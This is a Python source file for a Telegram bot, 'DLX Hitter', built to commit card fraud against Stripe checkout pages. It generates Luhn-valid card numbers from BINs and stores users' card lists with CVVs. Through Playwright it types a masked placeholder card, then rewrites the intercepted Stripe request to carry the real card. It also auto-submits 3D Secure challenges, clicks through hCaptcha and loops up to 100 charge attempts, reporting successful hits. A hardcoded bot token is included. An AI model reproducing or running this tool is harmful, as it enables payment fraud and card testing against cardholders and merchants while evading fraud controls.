#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DLX Hitter - Telegram Bot with Full Stripe Bypass (Playwright)
- Masked card + XHR interceptor (card replace)
- 100 hitting attempts with animated progress
- No amount displayed anywhere
- /gencard supports 3 formats:
  1. Single BIN: /gencard 424242
  2. BIN with pattern: /gencard 424242|12|26|123
  3. Range: /gencard 1-9 (generates from BINs 1 to 9)
"""

import os
import re
import json
import time
import random
import sqlite3
import logging
import asyncio
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple

from telegram import Update
from telegram.ext import (
    Application, CommandHandler,
    ContextTypes
)

from playwright.async_api import async_playwright, Page, Route, Request

# ============= CONFIGURATION =============
TOKEN = "8773929743:AAHudoClDOSqorsRIk1JpbYVw3vY1MidXjA"
DATABASE = "dlx_hitter.db"
MAX_ATTEMPTS = 100
RATE_LIMIT = 1.0
REQUEST_TIMEOUT = 15
RETRY_COUNT = 3

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============= DATABASE SETUP =============
def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        birth_date TEXT,
        registered_at TEXT,
        hits INTEGER DEFAULT 0,
        attempts INTEGER DEFAULT 0,
        last_url TEXT,
        last_cs_token TEXT,
        last_pk_key TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        bin TEXT,
        added_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card_number TEXT,
        month TEXT,
        year TEXT,
        cvv TEXT,
        added_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        timestamp TEXT,
        card TEXT,
        currency TEXT,
        merchant TEXT,
        success INTEGER,
        decline_code TEXT,
        receipt_url TEXT
    )''')
    conn.commit()
    conn.close()

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        if re.match(r'^6(?:011|5)', first6) or re.match(r'^622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[01][0-9]|92[0-5])', first6): return 'discover'
        if re.match(r'^3(?:0[0-5]|[68])', first6): return 'diners'
        if re.match(r'^35(?:2[89]|[3-8][0-9])', first6): return 'jcb'
        return 'unknown'

    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]; even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits: checksum += sum(digits_of(d * 2))
        return checksum % 10

    @staticmethod
    def generate_luhn_check_digit(card_number: str) -> int:
        for i in range(10):
            if CardGenerator.luhn_checksum(card_number + str(i)) == 0:
                return i
        return 0

    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4: return None
        bin_pattern, month_pattern, year_pattern, cvv_pattern = bin_number, None, None, None
        if '|' in bin_number:
            parts = bin_number.split('|')
            bin_pattern = parts[0]
            month_pattern = parts[1] if len(parts) > 1 else None
            year_pattern = parts[2] if len(parts) > 2 else None
            cvv_pattern = parts[3] if len(parts) > 3 else None
        bin_pattern = re.sub(r'[^0-9xX]', '', bin_pattern)
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining): card += str(random.randint(0, 9))
        check_digit = CardGenerator.generate_luhn_check_digit(card)
        full_card = card + str(check_digit)
        # Month
        if month_pattern:
            month = month_pattern.zfill(2) if month_pattern.lower() != 'xx' else f"{random.randint(1,12):02d}"
        else:
            future_month = datetime.now().month + random.randint(1, 36)
            month = f"{((future_month-1)%12)+1:02d}"
        # Year
        if year_pattern:
            year = year_pattern.zfill(2) if year_pattern.lower() != 'xx' else f"{datetime.now().year + random.randint(1,8):02d}"
        else:
            year = f"{datetime.now().year + random.randint(1,5):02d}"
        # CVV
        if cvv_pattern:
            if cvv_pattern.lower() in ('xxx','xxxx'):
                cvv = ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
            else:
                cvv = cvv_pattern.zfill(cvv_len)
        else:
            cvv = ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}

    @staticmethod
    def parse_gencard_input(user_input: str) -> List[str]:
        """
        Parse /gencard input:
        - Single BIN: "424242" -> ["424242"]
        - BIN with pattern: "424242|12|26|123" -> ["424242|12|26|123"]
        - Range: "1-9" -> ["1","2","3","4","5","6","7","8","9"]
        """
        user_input = user_input.strip()
        
        # Check for range (e.g., "1-9")
        range_match = re.match(r'^(\d+)-(\d+)$', user_input)
        if range_match:
            start = int(range_match.group(1))
            end = int(range_match.group(2))
            if start < 1 or end > 9 or start > end:
                return []
            return [str(i) for i in range(start, end + 1)]
        
        # Single BIN or pattern
        return [user_input]

# ============= ENHANCED PAYMENT INFO EXTRACTOR (NO AMOUNT) =============
def extract_cs_token(url: str, html: str) -> Optional[str]:
    cs_matches = re.findall(r'cs_[a-z]+_[a-zA-Z0-9]+', url + html)
    return cs_matches[0] if cs_matches else None

def extract_pk_key(html: str) -> Optional[str]:
    pk_matches = re.findall(r'pk_[a-z]+_[a-zA-Z0-9]+', html)
    return pk_matches[0] if pk_matches else None

def extract_merchant_from_html(html: str) -> str:
    patterns = [
        r'"business_name":"([^"]+)"',
        r'"display_name":"([^"]+)"',
        r'"merchant_name":"([^"]+)"',
        r'<title>(.*?)\s*[|–-]\s*Stripe\s*Checkout</title>',
    ]
    for pat in patterns:
        match = re.search(pat, html, re.IGNORECASE)
        if match:
            return match.group(1).strip()
    return "Unknown"

def get_payment_info(url: str) -> Tuple[bool, Dict]:
    """Get CS token, PK key, and merchant (no amount)."""
    for attempt in range(RETRY_COUNT):
        try:
            resp = requests.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            if resp.status_code != 200:
                return False, {'error': f'HTTP {resp.status_code} - Page not reachable'}
            html = resp.text
            final_url = resp.url

            cs_token = extract_cs_token(final_url, html)
            pk_key = extract_pk_key(html)
            merchant = extract_merchant_from_html(html)

            if cs_token:
                return True, {
                    'cs_token': cs_token,
                    'pk_key': pk_key,
                    'merchant': merchant,
                    'method': 'extracted'
                }
            return False, {'error': 'Could not extract payment information. The link may be invalid.'}
        except requests.exceptions.RequestException as e:
            if attempt == RETRY_COUNT - 1:
                return False, {'error': f'Network error: {e}'}
            time.sleep(1)
    return False, {'error': 'Unknown error'}

# ============= BROWSER AUTOMATION WITH MASKED CARD + INTERCEPTOR =============
class StripeAutofill:
    CARD_FIELD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        '[class*="cardNumber"] input', 'input[name="number"]',
        'input[id*="card-number"]', 'input[name*="card_number"]',
        'input[placeholder*="0000"]', 'input[placeholder*="1234"]'
    ]
    EXPIRY_FIELD_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', 'input[aria-label*="expir"]',
        '[class*="CardExpiry"] input', '[class*="expiry"] input',
        'input[name="expiry"]', 'input[name="exp"]'
    ]
    CVC_FIELD_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        'input[aria-label*="CVC"]', 'input[aria-label*="CVV"]',
        'input[aria-label*="security code"]', 'input[aria-label*="Security code"]',
        '[class*="CardCvc"] input', '[class*="cvc"] input',
        'input[name="cvc"]', 'input[name="cvv"]'
    ]
    NAME_FIELD_SELECTORS = [
        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]', '[autocomplete="name"]',
        'input[placeholder*="Name on card"]', 'input[placeholder*="name on card"]',
        'input[aria-label*="Name"]', '[class*="billingName"] input', 'input[name="name"]'
    ]
    EMAIL_FIELD_SELECTORS = [
        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
        'input[id*="email"]', 'input[placeholder*="email"]', 'input[placeholder*="Email"]',
        '[class*="email"] input', 'input[aria-label*="email"]'
    ]
    SUBMIT_BUTTON_SELECTORS = [
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
        '[data-testid*="submit"]', '[data-testid*="pay"]'
    ]

    MASKED_CARD = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "000"

    def __init__(self, page: Page):
        self.page = page
        self.real_card = None
        self._interceptor_active = False

    async def enable_card_replace(self, real_card: Dict):
        """Enable request interception to replace masked card with real card."""
        self.real_card = real_card
        self._interceptor_active = True

        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                post_data = request.post_data
                if post_data and self.real_card:
                    # Replace masked card with real card
                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    # Also handle if expiry is sent as single field
                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)

    async def find_and_click_field(self, selectors: List[str]) -> bool:
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.focus()
                    return True
            except:
                continue
        return False

    async def fill_card(self, card: Dict):
        """Fill form with MASKED card values (real card will be replaced in interceptor)."""
        # Card number (masked)
        await self.find_and_click_field(self.CARD_FIELD_SELECTORS)
        await self.page.keyboard.type(self.MASKED_CARD, delay=random.randint(5, 12))
        # Expiry (masked)
        await self.page.keyboard.press('Tab')
        await self.page.keyboard.type(self.MASKED_EXPIRY, delay=random.randint(5, 12))
        # CVV (masked)
        await self.page.keyboard.press('Tab')
        await self.page.keyboard.type(self.MASKED_CVV, delay=random.randint(5, 12))

        # Name (always "DLX HITTER")
        if await self.find_and_click_field(self.NAME_FIELD_SELECTORS):
            await self.page.keyboard.type("DLX HITTER", delay=random.randint(5, 12))
        else:
            name_input = await self.page.query_selector('input[name="name"], input[placeholder*="Name"]')
            if name_input:
                await name_input.fill("DLX HITTER")

        # Email (random)
        email = f"dlx{random.randint(100,9999)}@example.com"
        if await self.find_and_click_field(self.EMAIL_FIELD_SELECTORS):
            await self.page.keyboard.type(email, delay=random.randint(5, 12))
        else:
            email_input = await self.page.query_selector('input[type="email"]')
            if email_input:
                await email_input.fill(email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_BUTTON_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        text = await self.page.text_content('body')
        if '3D Secure' in text or 'Authentication' in text:
            return True
        return False

    async def wait_for_3ds(self, timeout: int = 30000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        logger.info("3DS detected, attempting auto-complete...")
        form = await self.page.query_selector('form')
        if form:
            await form.evaluate('form => form.submit()')
            await asyncio.sleep(3)
            return True
        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
        if cont:
            await cont.click()
            await asyncio.sleep(3)
            return True
        iframe = await self.page.query_selector('iframe[src*="3ds"]')
        if iframe:
            frame = await iframe.content_frame()
            if frame:
                btn = await frame.query_selector('button')
                if btn:
                    await btn.click()
                    await asyncio.sleep(3)
                    return True
        return False

    async def handle_captcha(self):
        try:
            frame_locator = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame_locator:
                checkbox = frame_locator.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
                    return True
        except Exception:
            pass
        return False

# ============= TELEGRAM HANDLERS =============
active_tasks = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to DLX Hitter Bot!\n"
        "Use /register <username> <birth_date> to register.\n"
        "Then /url <stripe_checkout_url> to save a Stripe link.\n"
        "Use /bin <BIN> to add a BIN (e.g., /bin 424242 or /bin 424242|12|26|123).\n"
        "Use /card to add CCs (one per line, format: cc|mm|yy|cvv).\n"
        "Type /gen [BIN] to start hitting (100 attempts).\n"
        "Type /gencard <BIN> to generate cards (supports: single BIN, pattern, or range like 1-9)\n"
        "Type /info for stats.\n"
        "Type /cmd for all commands."
    )

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /register <username> <birth_date>")
        return
    username = args[0]
    birth_date = args[1]
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    if c.fetchone():
        await update.message.reply_text("You are already registered.")
    else:
        c.execute("INSERT INTO users (user_id, username, birth_date, registered_at) VALUES (?,?,?,?)",
                  (user_id, username, birth_date, datetime.now().isoformat()))
        conn.commit()
        await update.message.reply_text(f"✅ Registered as {username}.")
    conn.close()

async def save_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /url <stripe_checkout_url>")
        return
    url = args[0]
    success, info = get_payment_info(url)
    if not success:
        await update.message.reply_text(f"❌ Failed to load URL: {info.get('error')}")
        return
    cs_token = info['cs_token']
    pk_key = info['pk_key']
    merchant = info['merchant']
    method = info.get('method', 'unknown')

    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("UPDATE users SET last_url=?, last_cs_token=?, last_pk_key=? WHERE user_id=?",
              (url, cs_token, pk_key, user_id))
    conn.commit()
    conn.close()

    msg = (
        f"✅ URL Saved\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⊀ URL\n⤷ {url[:80]}...\n"
        f"⊀ Keys ↬ ✅ Detected ({method})\n"
        f"⊀ pk ↬ {pk_key}\n"
        f"⊀ cs ↬ {cs_token}\n"
        f"🏢 Merchant: {merchant}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(msg)

async def add_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /bin <BIN>")
        return
    bin_input = args[0]
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM bins WHERE user_id=?", (user_id,))
    count = c.fetchone()[0]
    if count >= 100:
        await update.message.reply_text("Maximum 100 BINs allowed.")
        conn.close()
        return
    c.execute("INSERT INTO bins (user_id, bin, added_at) VALUES (?,?,?)",
              (user_id, bin_input, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ BIN {bin_input} added.")

async def add_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not update.message.text:
        return
    lines = update.message.text.split('\n')
    valid_cards = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        parts = line.split('|')
        if len(parts) == 4 and parts[0].isdigit() and len(parts[0]) >= 13:
            valid_cards.append((parts[0], parts[1], parts[2], parts[3]))
        else:
            await update.message.reply_text(f"Invalid card format: {line}")
            return
    if not valid_cards:
        return
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM cards WHERE user_id=?", (user_id,))
    current = c.fetchone()[0]
    if current + len(valid_cards) > 100:
        await update.message.reply_text(f"You already have {current} cards. Max 100.")
        conn.close()
        return
    for card in valid_cards:
        c.execute("INSERT INTO cards (user_id, card_number, month, year, cvv, added_at) VALUES (?,?,?,?,?,?)",
                  (user_id, card[0], card[1], card[2], card[3], datetime.now().isoformat()))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ {len(valid_cards)} cards added.")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT username, birth_date, registered_at, hits, attempts FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        await update.message.reply_text("You are not registered. Use /register.")
        conn.close()
        return
    username, birth, reg, hits, attempts = row
    c.execute("SELECT COUNT(*) FROM bins WHERE user_id=?", (user_id,))
    bin_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM cards WHERE user_id=?", (user_id,))
    card_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM hits WHERE user_id=? AND success=1", (user_id,))
    successes = c.fetchone()[0]
    conn.close()
    ratio = successes/attempts*100 if attempts>0 else 0
    msg = (
        f"👤 User: {username}\n"
        f"📅 Birth: {birth}\n"
        f"📅 Registered: {reg[:10]}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 BINs: {bin_count}\n"
        f"💳 Cards: {card_count}\n"
        f"🎯 Attempts: {attempts}\n"
        f"✅ Successes: {successes}\n"
        f"📊 Hit ratio: {ratio:.1f}%\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(msg)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📋 DLX Hitter Commands\n"
        "/start - Welcome\n"
        "/register <username> <birth_date> - Register\n"
        "/url <stripe_url> - Save checkout URL\n"
        "/bin <BIN> - Add a BIN (e.g., /bin 424242 or /bin 424242|12|26|123)\n"
        "/card - Send a message with cards (one per line, format: cc|mm|yy|cvv)\n"
        "/bins - List saved BINs\n"
        "/cards - List saved cards\n"
        "/clearbins - Clear all BINs\n"
        "/clearcards - Clear all cards\n"
        "/gen [BIN] - Start hitting (100 attempts, stops after first success)\n"
        "/gencard <BIN> - Generate cards from BIN (supports: single BIN, pattern, or range 1-9)\n"
        "/info - Show stats\n"
        "/cmd - This help"
    )
    await update.message.reply_text(msg)

async def list_bins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT bin FROM bins WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("No BINs saved.")
        return
    msg = "📋 Your BINs:\n" + "\n".join(f"• {r[0]}" for r in rows[:50])
    await update.message.reply_text(msg)

async def list_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT card_number, month, year, cvv FROM cards WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("No cards saved.")
        return
    msg = "💳 Your Cards:\n" + "\n".join(f"• {r[0]}|{r[1]}|{r[2]}|{r[3]}" for r in rows[:20])
    await update.message.reply_text(msg)

async def clear_bins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("DELETE FROM bins WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text("✅ All BINs cleared.")

async def clear_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("DELETE FROM cards WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text("✅ All cards cleared.")

async def gencard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: /gencard <BIN>\n"
            "Examples:\n"
            "  /gencard 424242\n"
            "  /gencard 424242|12|26|123\n"
            "  /gencard 1-9  (generates cards from BINs 1 to 9)"
        )
        return
    
    bin_input = args[0]
    bin_list = CardGenerator.parse_gencard_input(bin_input)
    
    if not bin_list:
        await update.message.reply_text("Invalid input. Use: /gencard 424242 or /gencard 1-9")
        return
    
    generated = []
    for bin_str in bin_list:
        card = CardGenerator.generate_card(bin_str)
        if card:
            generated.append(card)
    
    if not generated:
        await update.message.reply_text("Failed to generate any cards. Invalid BIN?")
        return
    
    output = "\n".join(f"{c['card']}|{c['month']}|{c['year']}|{c['cvv']}" for c in generated)
    
    # Add header info
    if len(bin_list) > 1:
        header = f"📊 Generated {len(generated)} cards from BINs {bin_list[0]}-{bin_list[-1]}:\n\n"
    else:
        header = f"📊 Generated {len(generated)} cards from BIN {bin_list[0]}:\n\n"
    
    full_output = header + output
    
    if len(full_output) > 4000:
        # Split into multiple messages
        parts = [full_output[i:i+4000] for i in range(0, len(full_output), 4000)]
        for part in parts:
            await update.message.reply_text(f"```\n{part}\n```", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"```\n{full_output}\n```", parse_mode='Markdown')

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id in active_tasks:
        await update.message.reply_text("A hitting process is already running for you. Please wait.")
        return

    args = context.args
    provided_bin = args[0] if args else None

    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT last_url FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or not row[0]:
        await update.message.reply_text("No saved URL. Use /url first.")
        conn.close()
        return
    url = row[0]

    success, info = get_payment_info(url)
    if not success:
        await update.message.reply_text(f"❌ Failed to get payment info: {info.get('error')}")
        conn.close()
        return
    merchant = info['merchant']

    if provided_bin:
        bins = [provided_bin]
        cards = []
    else:
        c.execute("SELECT bin FROM bins WHERE user_id=?", (user_id,))
        bins = [r[0] for r in c.fetchall()]
        c.execute("SELECT card_number, month, year, cvv FROM cards WHERE user_id=?", (user_id,))
        cards = [{'card': r[0], 'month': r[1], 'year': r[2], 'cvv': r[3]} for r in c.fetchall()]
    conn.close()

    if not bins and not cards:
        await update.message.reply_text("No BINs or cards added.")
        return

    # Send start message with progress animation placeholder
    progress_msg = await update.message.reply_text("🔄 [░░░░░░░░░░░░░░░░░░░░] 0% (0/100)")
    await asyncio.sleep(0.5)

    async def hitting_task():
        try:
            await run_hitting(user_id, url, bins, cards, merchant, chat_id, context, progress_msg)
        finally:
            active_tasks.discard(user_id)

    task = asyncio.create_task(hitting_task())
    active_tasks.add(user_id)

async def run_hitting(user_id: int, url: str, bins: List[str], cards: List[Dict],
                      merchant: str, chat_id: int, context: ContextTypes.DEFAULT_TYPE,
                      progress_msg: Update):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            await page.goto(url, timeout=30000)
            await asyncio.sleep(3)

            autofill = StripeAutofill(page)
            await autofill.handle_captcha()

            attempts = 0
            successes = 0

            for i in range(MAX_ATTEMPTS):
                # Update progress bar
                percent = int((i + 1) * 100 / MAX_ATTEMPTS)
                bar_length = 20
                filled = int(bar_length * (i + 1) / MAX_ATTEMPTS)
                bar = "█" * filled + "░" * (bar_length - filled)
                await progress_msg.edit_text(f"🔄 [{bar}] {percent}% ({i+1}/{MAX_ATTEMPTS})")

                # Generate card
                if bins:
                    bin_input = bins[i % len(bins)]
                    card = CardGenerator.generate_card(bin_input)
                    if not card:
                        continue
                else:
                    card_idx = i % len(cards)
                    card = cards[card_idx].copy()

                # Enable card replace interceptor with real card
                await autofill.enable_card_replace(card)

                # Fill form with MASKED values (real card will be replaced in interceptor)
                await autofill.fill_card(card)

                # Submit
                submitted = await autofill.submit()
                if not submitted:
                    await context.bot.send_message(chat_id=chat_id, text="❌ Submit button not found.")
                    break

                await asyncio.sleep(5)

                if await autofill.wait_for_3ds(10000):
                    await autofill.auto_complete_3ds()
                    await asyncio.sleep(5)

                await autofill.handle_captcha()

                current_url = page.url
                if 'receipt' in current_url or 'thank_you' in current_url:
                    successes += 1
                    conn = sqlite3.connect(DATABASE)
                    c = conn.cursor()
                    c.execute("INSERT INTO hits (user_id, timestamp, card, currency, merchant, success, receipt_url) VALUES (?,?,?,?,?,?,?)",
                              (user_id, datetime.now().isoformat(), f"{card['card']}|{card['month']}|{card['year']}|{card['cvv']}",
                               "", merchant, 1, current_url))
                    c.execute("UPDATE users SET hits = hits + 1, attempts = attempts + 1 WHERE user_id=?", (user_id,))
                    conn.commit()
                    conn.close()
                    await context.bot.send_message(chat_id=chat_id,
                                                   text=f"✅ Charge successful! (Attempt {i+1})\n"
                                                        f"💳 Card: {card['card']}|{card['month']}|{card['year']}|{card['cvv']}\n"
                                                        f"🏢 Merchant: {merchant}\n"
                                                        f"🔗 Receipt URL: {current_url}")
                    break

                attempts += 1
                error_text = await page.text_content('body')
                decline_code = "card_declined" if "declined" in error_text.lower() else "unknown"

                conn = sqlite3.connect(DATABASE)
                c = conn.cursor()
                c.execute("INSERT INTO hits (user_id, timestamp, card, currency, merchant, success, decline_code) VALUES (?,?,?,?,?,?,?)",
                          (user_id, datetime.now().isoformat(), f"{card['card']}|{card['month']}|{card['year']}|{card['cvv']}",
                           "", merchant, 0, decline_code))
                c.execute("UPDATE users SET attempts = attempts + 1 WHERE user_id=?", (user_id,))
                conn.commit()
                conn.close()

                # Decline message: only card and decline code
                await context.bot.send_message(chat_id=chat_id,
                                               text=f"❌ Attempt {i+1} declined\n"
                                                    f"💳 Card: {card['card']}|{card['month']}|{card['year']}|{card['cvv']}\n"
                                                    f"📉 Decline code: {decline_code}")

                # Reload page for next attempt
                await page.goto(url)
                await asyncio.sleep(3)
                await asyncio.sleep(RATE_LIMIT)

            # Final progress update
            await progress_msg.edit_text(f"✅ Completed! {successes} successful out of {attempts} attempts.")
            await asyncio.sleep(3)
            await progress_msg.delete()
            await context.bot.send_message(chat_id=chat_id,
                                           text=f"Finished. {successes} successful out of {attempts} attempts.")
            await browser.close()
    except Exception as e:
        logger.error(f"Error in hitting task for user {user_id}: {e}")
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}")

def main():
    init_db()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("register", register))
    app.add_handler(CommandHandler("url", save_url))
    app.add_handler(CommandHandler("bin", add_bin))
    app.add_handler(CommandHandler("card", add_cards))
    app.add_handler(CommandHandler("bins", list_bins))
    app.add_handler(CommandHandler("cards", list_cards))
    app.add_handler(CommandHandler("clearbins", clear_bins))
    app.add_handler(CommandHandler("clearcards", clear_cards))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("cmd", cmd_help))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("gencard", gencard))
    app.run_polling()

if __name__ == "__main__":
    main()